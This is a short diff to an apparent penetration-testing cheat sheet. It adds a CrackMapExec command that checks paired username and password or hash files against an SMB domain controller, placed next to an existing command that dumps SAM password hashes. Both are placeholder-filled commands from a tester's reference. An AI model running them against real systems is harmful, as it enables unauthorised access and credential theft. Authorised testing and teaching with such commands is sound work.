@@ -106,6 +106,9 @@ crackmapexec smb --list-modules
 `CrackMapExec` notable modules usage:
 
 ```
+# Authentication with a 1:1 mapping between the username and password / hashes files.
+crackmapexec smb <DC_IP | TARGET> --continue-on-success --no-bruteforce -d '<DOMAIN>' -u <USERNAME_FILE> [-p <PASSWORD_FILE> | -H <HASH_FILE>
+
 # SAM dump.
 crackmapexec smb <TARGET | TARGETS> --sam (-d <DOMAIN> | --local-auth) -u <USERNAME> (-p <PASSWORD | PASSWORDS_FILE> | -H <HASH>)
 
